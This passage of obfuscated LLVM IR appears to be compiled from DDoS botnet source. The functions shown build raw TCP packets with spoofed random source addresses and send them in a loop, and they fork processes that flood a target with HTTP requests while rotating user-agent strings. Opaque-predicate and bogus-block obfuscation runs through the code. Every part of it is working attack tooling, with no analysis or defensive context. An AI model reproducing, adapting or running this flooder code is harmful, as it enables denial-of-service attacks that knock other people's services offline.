  %_160 = sub i16 0, %776
  %gen161 = add i16 %_160, -257
  %777 = and i16 %776, -257
  %_162 = shl i16 %777, 256
  %_163 = sub i16 0, %777
  %gen164 = add i16 %_163, 256
  %778 = or i16 %777, 256
  store i16 %778, i16* %775, align 4
  br label %originalBB151

originalBB168alteredBB:                           ; preds = %originalBB168, %430
  %779 = load i8*, i8** %23, align 8
  %780 = call i32 @strcmp(i8* %779, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %781 = icmp ne i32 %780, 0
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %485
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %502
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %519
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %538
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %607
  %782 = load i32, i32* %17, align 4
  %783 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %784 = call i64 @sendto(i32 %782, i8* %169, i64 %167, i32 0, %struct.sockaddr* %783, i32 16)
  %785 = load i32, i32* %19, align 4
  %786 = call i32 @getRandomIP(i32 %785)
  %787 = call i32 @htonl(i32 %786) #10
  %788 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %789 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %788, i32 0, i32 8
  store i32 %787, i32* %789, align 4
  %790 = call i32 @rand_cmwc()
  %791 = trunc i32 %790 to i16
  %792 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %793 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %792, i32 0, i32 3
  store i16 %791, i16* %793, align 4
  %794 = call i32 @rand_cmwc()
  %795 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %796 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %795, i32 0, i32 0
  %797 = bitcast %union.anon* %796 to %struct.anon.0*
  %798 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %797, i32 0, i32 2
  store i32 %794, i32* %798, align 4
  %799 = call i32 @rand_cmwc()
  %800 = trunc i32 %799 to i16
  %801 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %802 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %801, i32 0, i32 0
  %803 = bitcast %union.anon* %802 to %struct.anon.0*
  %804 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %803, i32 0, i32 0
  store i16 %800, i16* %804, align 4
  %805 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %806 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %805, i32 0, i32 0
  %807 = bitcast %union.anon* %806 to %struct.anon.0*
  %808 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %807, i32 0, i32 6
  store i16 0, i16* %808, align 4
  %809 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %810 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %811 = call zeroext i16 @tcpcsum(%struct.iphdr* %809, %struct.tcphdr* %810)
  %812 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %813 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %812, i32 0, i32 0
  %814 = bitcast %union.anon* %813 to %struct.anon.0*
  %815 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %814, i32 0, i32 6
  store i16 %811, i16* %815, align 4
  %816 = bitcast i8* %169 to i16*
  %817 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %818 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %817, i32 0, i32 2
  %819 = load i16, i16* %818, align 2
  %820 = zext i16 %819 to i32
  %821 = call zeroext i16 @csum(i16* %816, i32 %820)
  %822 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %823 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %822, i32 0, i32 7
  store i16 %821, i16* %823, align 2
  %824 = load i32, i32* %25, align 4
  %825 = load i32, i32* %15, align 4
  %826 = icmp eq i32 %824, %825
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %676
  %827 = load i32, i32* %25, align 4
  %_193 = sub i32 %827, 1
  %gen194 = mul i32 %_193, 1
  %_195 = shl i32 %827, 1
  %_196 = sub i32 0, %827
  %gen197 = add i32 %_196, 1
  %_198 = sub i32 %827, 1
  %gen199 = mul i32 %_198, 1
  %_200 = shl i32 %827, 1
  %_201 = sub i32 0, %827
  %gen202 = add i32 %_201, 1
  %_203 = shl i32 %827, 1
  %_204 = sub i32 0, %827
  %gen205 = add i32 %_204, 1
  %828 = add i32 %827, 1
  store i32 %828, i32* %25, align 4
  br label %originalBB192
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %61

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* @x.77
  %39 = load i32, i32* @y.78
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* %9, align 4
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = icmp eq i32 %48, -1
  %50 = load i32, i32* @x.77
  %51 = load i32, i32* @y.78
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %59

; <label>:58:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %36, %13
  %62 = load i32, i32* @x.77
  %63 = load i32, i32* @y.78
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %3, align 4
  %71 = load i32, i32* @x.77
  %72 = load i32, i32* @y.78
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %37
  %79 = load i32, i32* %9, align 4
  %80 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %81 = call i32 @connect(i32 %79, %struct.sockaddr* %80, i32 16)
  %82 = icmp eq i32 %81, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %83 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %99, %6
  %25 = load i32, i32* @x.79
  %26 = load i32, i32* @y.80
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* %14, align 4
  %34 = load i32, i32* %12, align 4
  %35 = icmp slt i32 %33, %34
  %36 = load i32, i32* @x.79
  %37 = load i32, i32* @y.80
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %102

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %46 = load i8*, i8** %7, align 8
  %47 = load i8*, i8** %10, align 8
  %48 = load i8*, i8** %8, align 8
  %49 = call i32 @rand() #5
  %50 = srem i32 %49, 59
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %46, i8* %47, i8* %48, i8* %53) #5
  %55 = call i32 @fork() #5
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %98

; <label>:57:                                     ; preds = %44
  br label %58

; <label>:58:                                     ; preds = %96, %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #5
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %97

; <label>:63:                                     ; preds = %58
  %64 = load i8*, i8** %8, align 8
  %65 = load i16, i16* %9, align 2
  %66 = call i32 @socket_connect(i8* %64, i16 zeroext %65)
  store i32 %66, i32* %13, align 4
  %67 = load i32, i32* %13, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %96

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* @x.79
  %71 = load i32, i32* @y.80
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* %13, align 4
  %79 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %81 = call i64 @strlen(i8* %80) #9
  %82 = call i64 @write(i32 %78, i8* %79, i64 %81)
  %83 = load i32, i32* %13, align 4
  %84 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %85 = call i64 @read(i32 %83, i8* %84, i64 1)
  %86 = load i32, i32* %13, align 4
  %87 = call i32 @close(i32 %86)
  %88 = load i32, i32* @x.79
  %89 = load i32, i32* @y.80
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %96

; <label>:96:                                     ; preds = %originalBBpart24, %63
  br label %58

; <label>:97:                                     ; preds = %58
  call void @exit(i32 0) #12
  unreachable

; <label>:98:                                     ; preds = %44
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %14, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %14, align 4
  br label %24

; <label>:102:                                    ; preds = %originalBBpart2
  %103 = load i32, i32* @x.79
  %104 = load i32, i32* @y.80
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %102
  %111 = load i32, i32* @x.79
  %112 = load i32, i32* @y.80
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  %119 = load i32, i32* %14, align 4
  %120 = load i32, i32* %12, align 4
  %121 = icmp slt i32 %119, %120
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %122 = load i32, i32* %13, align 4
  %123 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %124 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %125 = call i64 @strlen(i8* %124) #9
  %126 = call i64 @write(i32 %122, i8* %123, i64 %125)
  %127 = load i32, i32* %13, align 4
  %128 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %129 = call i64 @read(i32 %127, i8* %128, i64 1)
  %130 = load i32, i32* %13, align 4
  %131 = call i32 @close(i32 %130)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %102
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([285 x i8], [285 x i8]* @.str.164, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %150, %6
  %28 = load i32, i32* @x.81
  %29 = load i32, i32* @y.82
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %36, %37
  %39 = load i32, i32* @x.81
  %40 = load i32, i32* @y.82
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %153

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.81
  %49 = load i32, i32* @y.82
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %59 = load i8*, i8** %8, align 8
  %60 = call i32 @rand() #5
  %61 = srem i32 %60, 59
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %62
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i8*, i8*, ...) @sprintf(i8* %56, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %57, i8* %58, i8* %59, i8* %64) #5
  %66 = call i32 @fork() #5
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.81
  %69 = load i32, i32* @y.82
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %76, label %149

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = load i32, i32* @x.81
  %78 = load i32, i32* @y.82
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i32, i32* @x.81
  %86 = load i32, i32* @y.82
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %131, %originalBBpart28
  %94 = load i32, i32* %15, align 4
  %95 = sext i32 %94 to i64
  %96 = call i64 @time(i64* null) #5
  %97 = icmp sgt i64 %95, %96
  br i1 %97, label %98, label %132

; <label>:98:                                     ; preds = %93
  %99 = load i8*, i8** %8, align 8
  %100 = load i16, i16* %9, align 2
  %101 = call i32 @socket_connect(i8* %99, i16 zeroext %100)
  store i32 %101, i32* %13, align 4
  %102 = load i32, i32* %13, align 4
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %131

; <label>:104:                                    ; preds = %98
  %105 = load i32, i32* @x.81
  %106 = load i32, i32* @y.82
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = load i32, i32* %13, align 4
  %114 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %115 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %116 = call i64 @strlen(i8* %115) #9
  %117 = call i64 @write(i32 %113, i8* %114, i64 %116)
  %118 = load i32, i32* %13, align 4
  %119 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %120 = call i64 @read(i32 %118, i8* %119, i64 1)
  %121 = load i32, i32* %13, align 4
  %122 = call i32 @close(i32 %121)
  %123 = load i32, i32* @x.81
  %124 = load i32, i32* @y.82
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %131

; <label>:131:                                    ; preds = %originalBBpart212, %98
  br label %93

; <label>:132:                                    ; preds = %93
  %133 = load i32, i32* @x.81
  %134 = load i32, i32* @y.82
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  call void @exit(i32 0) #12
  %141 = load i32, i32* @x.81
  %142 = load i32, i32* @y.82
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  unreachable

; <label>:149:                                    ; preds = %originalBBpart24
  br label %150

; <label>:150:                                    ; preds = %149
  %151 = load i32, i32* %14, align 4
  %152 = add nsw i32 %151, 1
  store i32 %152, i32* %14, align 4
  br label %27

; <label>:153:                                    ; preds = %originalBBpart2
  %154 = load i32, i32* @x.81
  %155 = load i32, i32* @y.82
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %153
  %162 = load i32, i32* @x.81
  %163 = load i32, i32* @y.82
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %170 = load i32, i32* %14, align 4
  %171 = load i32, i32* %12, align 4
  %172 = icmp slt i32 %170, %171
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %173 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %174 = load i8*, i8** %7, align 8
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %176 = load i8*, i8** %8, align 8
  %177 = call i32 @rand() #5
  %_ = shl i32 %177, 59
  %_2 = shl i32 %177, 59
  %178 = srem i32 %177, 59
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %179
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 (i8*, i8*, ...) @sprintf(i8* %173, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %174, i8* %175, i8* %176, i8* %181) #5
  %183 = call i32 @fork() #5
  %184 = icmp ne i32 %183, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %185 = load i32, i32* %13, align 4
  %186 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %187 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %188 = call i64 @strlen(i8* %187) #9
  %189 = call i64 @write(i32 %185, i8* %186, i64 %188)
  %190 = load i32, i32* %13, align 4
  %191 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %192 = call i64 @read(i32 %190, i8* %191, i64 1)
  %193 = load i32, i32* %13, align 4
  %194 = call i32 @close(i32 %193)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  call void @exit(i32 0) #12
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %153
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPTXT(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.165, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %118, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %121

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %117

; <label>:44:                                     ; preds = %31
  %45 = load i32, i32* @x.83
  %46 = load i32, i32* @y.84
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

